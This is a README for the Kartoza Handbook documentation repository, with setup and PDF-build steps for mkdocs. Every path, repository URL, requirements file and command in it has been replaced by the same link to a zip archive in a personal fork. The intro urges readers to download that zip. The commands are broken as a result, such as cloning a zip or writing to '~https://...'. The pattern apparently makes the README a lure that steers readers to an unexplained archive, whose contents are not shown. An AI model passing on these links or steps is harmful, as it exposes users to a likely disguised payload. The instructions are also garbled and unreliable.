# Kartoza Handbook

Organisational Handbook and Technical Docs Repository for Kartoza. Here is where we highlight the procedures, principles and processes related to Development, DevOps and GIS, in line with the organisation's best practices. Please review this content at [https://github.com/Shamzmohamed/TheKartozaHandbook/raw/refs/heads/main/docs/src/gis/resources/ngi/Kartoza-Handbook-The-v2.4.zip](https://github.com/Shamzmohamed/TheKartozaHandbook/raw/refs/heads/main/docs/src/gis/resources/ngi/Kartoza-Handbook-The-v2.4.zip) for more information.

## Building the Kartoza Handbook as a PDF

### Check out the code

You need both the Kartoza Handbook repo and the mkdocs pdf building repo:

```bash
git clone https://github.com/Shamzmohamed/TheKartozaHandbook/raw/refs/heads/main/docs/src/gis/resources/ngi/Kartoza-Handbook-The-v2.4.zip
```

### Install Dependencies (non direnv and venv way)

You need to install these packages:

```bash
pip install mkdocs-with-pdf
pip install mkdocs-material
pip install mdx_gh_links
pip install mkdocs-pdf-export-plugin
```

### Install Dependencies (venv way)

Initial setup

```bash
virtualenv --python=python3 env
source env/bin/activate
pip install -r https://github.com/Shamzmohamed/TheKartozaHandbook/raw/refs/heads/main/docs/src/gis/resources/ngi/Kartoza-Handbook-The-v2.4.zip
```

Subsequent sessions:

```bash
source env/bin/activate
```
When you are done with your session, deactivate your venv:

```bash
deactivate
```

### Using direnv (more preferred way)

Initial setup done once:

1. Install direnv with your package manager
2. Make sure it is set up in your bashrc 
```
echo 'eval "$(direnv hook bash)"' >> ~https://github.com/Shamzmohamed/TheKartozaHandbook/raw/refs/heads/main/docs/src/gis/resources/ngi/Kartoza-Handbook-The-v2.4.zip
source ~https://github.com/Shamzmohamed/TheKartozaHandbook/raw/refs/heads/main/docs/src/gis/resources/ngi/Kartoza-Handbook-The-v2.4.zip
```
3. Enter this git directory in your shell
4. ```pip install -r https://github.com/Shamzmohamed/TheKartozaHandbook/raw/refs/heads/main/docs/src/gis/resources/ngi/Kartoza-Handbook-The-v2.4.zip```

After this, whenever you enter the directory, direnv will load your direnv and penv for you. See .envrc for details on how it is configured.


### Build the documentation

> Note that whenever you add new sections to nav in the https://github.com/Shamzmohamed/TheKartozaHandbook/raw/refs/heads/main/docs/src/gis/resources/ngi/Kartoza-Handbook-The-v2.4.zip
> (used for building the web version), you should apply those same
> edits to https://github.com/Shamzmohamed/TheKartozaHandbook/raw/refs/heads/main/docs/src/gis/resources/ngi/Kartoza-Handbook-The-v2.4.zip if you want those new sections to appear
> in the pdf too.

```bash
cd  docs
https://github.com/Shamzmohamed/TheKartozaHandbook/raw/refs/heads/main/docs/src/gis/resources/ngi/Kartoza-Handbook-The-v2.4.zip
xdg-open https://github.com/Shamzmohamed/TheKartozaHandbook/raw/refs/heads/main/docs/src/gis/resources/ngi/Kartoza-Handbook-The-v2.4.zip
```

If you are in VSCode, you can also just run the 'Compile PDF' task. The
generated PDF will be placed in docs/pdfs/.
